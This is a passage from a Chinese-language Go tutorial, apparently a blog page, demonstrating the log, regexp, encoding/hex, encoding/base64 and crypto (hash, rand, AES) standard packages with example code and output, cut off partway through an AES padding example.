err!=nil {</span><br><span class="line">fmt.Printf("%v",err)</span><br><span class="line">}else{</span><br><span class="line">fmt.Printf("%s",string(cmd))</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">"log"</span><br><span class="line">)</span><br><span class="line">func main() {</span><br><span class="line">log.Println("Gooood")</span><br><span class="line">log.Println("Loooog")</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">2019/12/03 23:05:40 Gooood</span><br><span class="line">2019/12/03 23:05:40 Loooog</span><br></pre></td></tr></tbody></table></figure><p>自定义Logger类型，log.Logger提供了一个New方法用来创建对象：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func New(out io.Writer, prefix string, flag int) *Logger</span><br></pre></td></tr></tbody></table></figure><p></p><p>该函数一共有三个参数：</p><ol><li>输出位置out，是一个io.Writer对象，该对象可以是一个文件也可以是实现了该接口的对象。通常我们可以用这个来指定日志输出到哪个文件。</li><li>prefix 我们在前面已经看到，就是在日志内容前面的东西。我们可以将其置为 “[Info]” 、 “[Warning]”等来帮助区分日志级别。</li><li>flags 是一个选项，显示日志开头的东西，可选的值有：<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Ldate         = 1 &lt;&lt; iota     // 形如 2009/01/23 的日期</span><br><span class="line">Ltime                         // 形如 01:23:23   的时间</span><br><span class="line">Lmicroseconds                 // 形如 01:23:23.123123   的时间</span><br><span class="line">Llongfile                     // 全路径文件名和行号: /a/b/c/d.go:23 </span><br><span class="line">Lshortfile                    // 文件名和行号: d.go:23</span><br><span class="line">LstdFlags     = Ldate | Ltime // 日期和时间</span><br></pre></td></tr></tbody></table></figure></li></ol><p>设置前缀、输出格式<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="comment">// var out io.Writer</span></span><br><span class="line">debugger:=log.New(os.Stdout,<span class="string">"[info]\t"</span>,log.Llongfile)</span><br><span class="line">debugger.Println(<span class="string">"Gooood"</span>)</span><br><span class="line">debugger.Println(<span class="string">"Loooog"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h3><p>Golang的正则提供16种正则匹配方法<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find(All)?(String)?(Submatch)?(Index)?</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>MustCompile</code>和<code>Compile</code>区别<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MustCompile 的作用和 Compile 一样</span><br><span class="line">不同的是，当正则表达式 str 不合法时，MustCompile 会抛出异常</span><br><span class="line">而 Compile 仅返回一个 error 值</span><br></pre></td></tr></tbody></table></figure><p></p><p>CompilePOSIX和 Compile的区别<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CompilePOSIX 的作用和 Compile 一样</span><br><span class="line">不同的是，CompilePOSIX 使用 POSIX 语法，</span><br><span class="line">同时，它采用最左最长方式搜索，</span><br><span class="line">而 Compile 采用最左最短方式搜索</span><br><span class="line">POSIX 语法不支持 Perl 的语法格式：\d、\D、\s、\S、\w、\W</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>Match</code></p><blockquote><p><code>func Match(pattern string, b []byte) (matched bool, err error)</code>，</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.Match([]<span class="keyword">byte</span>(search)))</span><br></pre></td></tr></tbody></table></figure><p><code>MatchReader</code></p><blockquote><p><code>func MatchReader(pattern string, r io.RuneReader) (matched bool, err error)</code>，r：要在其中进行查找的 RuneReader 接口</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search := bytes.NewReader([]<span class="keyword">byte</span>(<span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span>))</span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.MatchReader(search))</span><br></pre></td></tr></tbody></table></figure><p><code>MatchString</code></p><blockquote><p>返回是否匹配到结果，true或者false</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search := "baidu:https://www.baidu.com google:https://www.google.com"</span><br><span class="line">pattern := `(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">ok:=re.MatchString(search)</span><br><span class="line">fmt.Println(ok)</span><br></pre></td></tr></tbody></table></figure><p><code>Find</code></p><blockquote><p><code>func (re *Regexp) Find(b []byte) []byte</code>，查找byte数组，并返回第一个匹配的内容</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">match:=re.Find([]<span class="keyword">byte</span>(search))</span><br><span class="line">fmt.Println(match)</span><br></pre></td></tr></tbody></table></figure><p><code>FindAll</code></p><blockquote><p><code>func (re *Regexp) FindAll(b []byte, n int) [][]byte</code>，查找前n个匹配项，如果n&lt;0，则查找所有匹配项</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">match:=re.FindAll([]<span class="keyword">byte</span>(search),<span class="number">-1</span>)</span><br><span class="line">fmt.Println(match)</span><br></pre></td></tr></tbody></table></figure><p><code>FindString</code></p><blockquote><p><code>func (re *Regexp) FindString(s string) string</code>，查找字符串，并返回第一个找到的结果</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">match:=re.FindString(search)</span><br><span class="line">fmt.Println(match)</span><br></pre></td></tr></tbody></table></figure><p><code>FindAllString</code></p><blockquote><p><code>func (re *Regexp) FindAllString(s string, n int) []string</code>，查找前n个匹配项，如果n&lt;0，则查找所有匹配项</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern) <span class="comment">//只有如果返回值，如果放回nil则说明没有匹配的结果</span></span><br><span class="line">fmt.Println(re.FindAllString(search, <span class="number">-1</span>)) </span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>FindAllStringIndex</code></p><blockquote><p><code>func (re *Regexp) FindAllStringIndex(s string, n int) [][]int</code>，返回匹配到的字符串的位置，[[起始位置, 结束位置], [起始位置, 结束位置], …]</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.FindAllStringIndex(search,<span class="number">-1</span>))</span><br></pre></td></tr></tbody></table></figure><p><code>FindStringSubmatch</code></p><blockquote><p><code>func (re *Regexp) FindStringSubmatch(s string) []string</code>，匹配子组的内容，第一个返回的内容是匹配到的整一个字符串。{完整匹配项, 子匹配项, 子匹配项, …}</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.FindStringSubmatch(search))</span><br></pre></td></tr></tbody></table></figure><p><code>ReplaceAllString</code></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.ReplaceAllString(search,<span class="string">"${1}http://www.test.com"</span>))</span><br><span class="line"></span><br><span class="line">baidu:http:<span class="comment">//www.test.com google:http://www.test.com</span></span><br></pre></td></tr></tbody></table></figure><p><code>ReplaceAllLiteralString</code></p><blockquote><p><code>func (re *Regexp) ReplaceAllLiteralString(src, repl string) string</code>， 如果 repl 中有”分组引用符”（$1、$name），则将“分组引用符”当普通字符处理</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.ReplaceAllLiteralString(search,<span class="string">"${1}http://www.test.com"</span>))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">baidu:${<span class="number">1</span>}http:<span class="comment">//www.test.com google:${1}http://www.test.com</span></span><br></pre></td></tr></tbody></table></figure><p><code>Split</code></p><blockquote><p><code>func (re *Regexp) Split(s string, n int) []string</code> 最多分割出 n 个子串，第 n 个子串不再进行分割 如果 n &lt; 0，则分割所有子串 返回分割后的子串列表</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search := <span class="string">"baidu:https://www.baidu.com google:https://www.google.com"</span></span><br><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.Split(search,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">[baidu:  google: ]</span><br></pre></td></tr></tbody></table></figure><p><code>String</code></p><blockquote><p>返回 re 中的“正则表达式”字符串</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern := <span class="string">`(http|https)?://[a-zA-Z0-9\.]+\.(com|net|cn|gov|edu)+`</span></span><br><span class="line">re := regexp.MustCompile(pattern)</span><br><span class="line">fmt.Println(re.String())</span><br></pre></td></tr></tbody></table></figure><h3 id="encoding"><a href="#encoding" class="headerlink" title="encoding"></a>encoding</h3><h4 id="encoding-hex"><a href="#encoding-hex" class="headerlink" title="encoding/hex"></a>encoding/hex</h4><blockquote><p>hex</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">name:=[]<span class="keyword">byte</span>(<span class="string">"test"</span>)</span><br><span class="line"><span class="comment">//字符串转化为16进制</span></span><br><span class="line">fmt.Println(hex.EncodeToString(name)) </span><br><span class="line"><span class="comment">//字符串转化为16进制</span></span><br><span class="line">endst:=<span class="built_in">make</span>([]<span class="keyword">byte</span>,hex.EncodedLen(<span class="built_in">len</span>(name)))</span><br><span class="line">hex.Encode(endst,[]<span class="keyword">byte</span>(name))</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(endst))</span><br><span class="line"><span class="comment">//16转字符串</span></span><br><span class="line">dst:=<span class="built_in">make</span>([]<span class="keyword">byte</span>,hex.DecodedLen(<span class="built_in">len</span>((<span class="string">"74657374"</span>))))</span><br><span class="line">hex.Decode(dst,[]<span class="keyword">byte</span>(<span class="string">"74657374"</span>))</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(dst))</span><br><span class="line"><span class="comment">//16转字符串</span></span><br><span class="line">hex2str,_:=hex.DecodeString(<span class="string">"74657374"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(hex2str))</span><br><span class="line"><span class="comment">//hexdump</span></span><br><span class="line">hexdump:=[]<span class="keyword">byte</span>(<span class="string">"A strong man will struggle with the storms of fate. -- Thomas Addison"</span>)</span><br><span class="line">fmt.Println(hex.Dump(hexdump))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="number">74657374</span></span><br><span class="line"><span class="number">74657374</span></span><br><span class="line">test</span><br><span class="line">test</span><br><span class="line"><span class="number">00000000</span>  <span class="number">41</span> <span class="number">20</span> <span class="number">73</span> <span class="number">74</span> <span class="number">72</span> <span class="number">6</span>f <span class="number">6</span>e <span class="number">67</span>  <span class="number">20</span> <span class="number">6</span>d <span class="number">61</span> <span class="number">6</span>e <span class="number">20</span> <span class="number">77</span> <span class="number">69</span> <span class="number">6</span>c  |A strong man wil|</span><br><span class="line"><span class="number">00000010</span>  <span class="number">6</span>c <span class="number">20</span> <span class="number">73</span> <span class="number">74</span> <span class="number">72</span> <span class="number">75</span> <span class="number">67</span> <span class="number">67</span>  <span class="number">6</span>c <span class="number">65</span> <span class="number">20</span> <span class="number">77</span> <span class="number">69</span> <span class="number">74</span> <span class="number">68</span> <span class="number">20</span>  |l struggle with |</span><br><span class="line"><span class="number">00000020</span>  <span class="number">74</span> <span class="number">68</span> <span class="number">65</span> <span class="number">20</span> <span class="number">73</span> <span class="number">74</span> <span class="number">6</span>f <span class="number">72</span>  <span class="number">6</span>d <span class="number">73</span> <span class="number">20</span> <span class="number">6</span>f <span class="number">66</span> <span class="number">20</span> <span class="number">66</span> <span class="number">61</span>  |the storms of fa|</span><br><span class="line"><span class="number">00000030</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">2</span>d <span class="number">2</span>d <span class="number">20</span> <span class="number">54</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">6</span>d <span class="number">61</span> <span class="number">73</span> <span class="number">20</span> <span class="number">41</span> <span class="number">64</span>  |te. -- Thomas Ad|</span><br><span class="line"><span class="number">00000040</span>  <span class="number">64</span> <span class="number">69</span> <span class="number">73</span> <span class="number">6</span>f <span class="number">6</span>e                                    |dison|</span><br></pre></td></tr></tbody></table></figure><h4 id="encoding-base64"><a href="#encoding-base64" class="headerlink" title="encoding/base64"></a>encoding/base64</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//base64编码</span></span><br><span class="line">b64:=[]<span class="keyword">byte</span>(<span class="string">"test"</span>)</span><br><span class="line">str2b64:=base64.StdEncoding.EncodeToString(b64)</span><br><span class="line">fmt.Println(str2b64)</span><br><span class="line"><span class="comment">//base64编码</span></span><br><span class="line">dst:=<span class="built_in">make</span>([]<span class="keyword">byte</span>,base64.StdEncoding.EncodedLen(<span class="built_in">len</span>(b64)))</span><br><span class="line">base64.StdEncoding.Encode(dst,b64)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(dst))</span><br><span class="line"><span class="comment">//base64解码</span></span><br><span class="line">data:=<span class="string">"dGVzdA=="</span></span><br><span class="line">b642str,_:=base64.StdEncoding.DecodeString(data)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(b642str))</span><br><span class="line"><span class="comment">//base64解码</span></span><br><span class="line">data_1:=[]<span class="keyword">byte</span>(data)</span><br><span class="line">dst=<span class="built_in">make</span>([]<span class="keyword">byte</span>,base64.StdEncoding.DecodedLen(<span class="built_in">len</span>(data_1)))</span><br><span class="line">base64.StdEncoding.Decode(dst,data_1)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(dst))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">dGVzdA==</span><br><span class="line">dGVzdA==</span><br><span class="line">test</span><br><span class="line">test</span><br></pre></td></tr></tbody></table></figure><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="crypto-md5"><a href="#crypto-md5" class="headerlink" title="crypto/md5"></a>crypto/md5</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MD5</span></span><br><span class="line">data := []<span class="keyword">byte</span>(<span class="string">"test"</span>)</span><br><span class="line">mymd5:=fmt.Sprintf(<span class="string">"%x"</span>,md5.Sum(data)) <span class="comment">//注意md5.Sum(data)返回是一个数组而不是切片</span></span><br><span class="line">fmt.Println(mymd5)</span><br><span class="line"></span><br><span class="line"><span class="comment">//sha1</span></span><br><span class="line">data := []<span class="keyword">byte</span>(<span class="string">"test"</span>)</span><br><span class="line">mymd5:=fmt.Sprintf(<span class="string">"%x"</span>,sha1.Sum(data))</span><br><span class="line">fmt.Println(mymd5)</span><br></pre></td></tr></tbody></table></figure><h4 id="crypto-sha256"><a href="#crypto-sha256" class="headerlink" title="crypto/sha256"></a>crypto/sha256</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data := []<span class="keyword">byte</span>(<span class="string">"test"</span>)</span><br><span class="line">mysha224:=fmt.Sprintf(<span class="string">"%x"</span>,sha256.Sum224(data)) <span class="comment">//sha224</span></span><br><span class="line">mysha256:=fmt.Sprintf(<span class="string">"%x"</span>,sha256.Sum256(data)) <span class="comment">//sha256</span></span><br><span class="line">fmt.Println(mysha224)</span><br><span class="line">fmt.Println(mysha256)</span><br></pre></td></tr></tbody></table></figure><h4 id="crypto-sha512"><a href="#crypto-sha512" class="headerlink" title="crypto/sha512"></a>crypto/sha512</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data := []<span class="keyword">byte</span>(<span class="string">"test"</span>)</span><br><span class="line">mysha384:=fmt.Sprintf(<span class="string">"%x"</span>,sha512.Sum384(data)) <span class="comment">//sha384</span></span><br><span class="line">mysha512:=fmt.Sprintf(<span class="string">"%x"</span>,sha512.Sum512(data)) <span class="comment">//sha512</span></span><br><span class="line">fmt.Println(mysha384)</span><br><span class="line">fmt.Println(mysha512)</span><br></pre></td></tr></tbody></table></figure><h4 id="crypto-rand"><a href="#crypto-rand" class="headerlink" title="crypto/rand"></a>crypto/rand</h4><p><code>rand.Reader</code></p><blockquote><p>ReadFull从rand.Reader精确地读取len(b)字节数据填充进b，rand.Reader是一个全局、共享的密码用强随机数生成器</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b:=<span class="built_in">make</span>([]<span class="keyword">byte</span>,<span class="number">64</span>)</span><br><span class="line">io.ReadFull(rand.Reader,b)</span><br><span class="line">fmt.Println(b)</span><br><span class="line">output:</span><br><span class="line">[<span class="number">132</span> <span class="number">20</span> <span class="number">249</span> <span class="number">35</span> <span class="number">161</span> <span class="number">31</span> <span class="number">131</span> <span class="number">62</span> <span class="number">200</span> <span class="number">97</span> <span class="number">167</span> <span class="number">216</span> <span class="number">145</span> <span class="number">88</span> <span class="number">146</span> <span class="number">242</span> <span class="number">249</span> <span class="number">70</span> <span class="number">7</span> <span class="number">62</span> <span class="number">249</span> <span class="number">47</span> <span class="number">240</span> <span class="number">60</span> <span class="number">73</span> <span class="number">89</span> <span class="number">148</span> <span class="number">232</span> <span class="number">61</span> <span class="number">187</span> <span class="number">77</span> <span class="number">241</span> <span class="number">179</span> <span class="number">12</span> <span class="number">24</span> <span class="number">84</span> <span class="number">118</span> <span class="number">164</span> <span class="number">101</span> <span class="number">244</span> <span class="number">240</span> <span class="number">4</span> <span class="number">55</span> <span class="number">11</span> <span class="number">59</span> <span class="number">255</span> <span class="number">140</span> <span class="number">206</span> <span class="number">10</span> <span class="number">81</span> <span class="number">170</span> <span class="number">107</span> <span class="number">57</span> <span class="number">195</span> <span class="number">27</span> <span class="number">122</span> <span class="number">3</span> <span class="number">81</span> <span class="number">207</span> <span class="number">123</span> <span class="number">53</span> <span class="number">14</span> <span class="number">241</span> <span class="number">91</span>]</span><br></pre></td></tr></tbody></table></figure><p><code>Prime</code></p><blockquote><p><code>Prime(rand io.Reader, bits int) (p *big.Int, err error)</code>，生成一个n bit的素数，如果n&lt;2，则会返回一个error</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p,_:=rand.Prime(rand.Reader,2048) //生成一个2048bit的素数</span><br><span class="line">fmt.Printf("%T\n",p)</span><br><span class="line">fmt.Println(p)</span><br></pre></td></tr></tbody></table></figure><p><code>rand.Int</code></p><blockquote><p><code>Int(rand io.Reader, max *big.Int) (n *big.Int, err error)</code>，取一个[0,max)的整数</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">max:=big.NewInt(math.MaxInt64)</span><br><span class="line">r,_:=rand.Int(rand.Reader,max)</span><br><span class="line">fmt.Println(r)</span><br></pre></td></tr></tbody></table></figure><h4 id="crypto-aes"><a href="#crypto-aes" class="headerlink" title="crypto/aes"></a>crypto/aes</h4><p>golang实现aes加密解密<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"bytes"</span></span><br><span class="line"><span class="string">"crypto/aes"</span></span><br><span class="line"><span class="string">"crypto/cipher"</span></span><br><span class="line"><span class="string">"crypto/rand"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">padding</span><span class="params">(data []<span class="keyword">byte</span>, BlackSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> {</span><br><span class="line">PadLen := BlackSize - <span class="built_in">len</span>(data)%BlackSize</span><br><span class="line">PadData := bytes.Repeat([]<span class="keyword">byte</span>{<span class="keyword">byte</span>(PadLen)}, PadLen)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(data, PadData...)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">unpadding</span><span class="params">(data []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> {</span><br><span class="line">n := <span class="built_in">len</span>(data)</span><br><span class="line">UnpadLen := <span class="keyword">int</span>(data[n<span class="number">-1</span>])</span><br><span class="line">UnpadData := data[:n-UnpadLen]</span><br><span class="line"><span class="keyword">return</span> 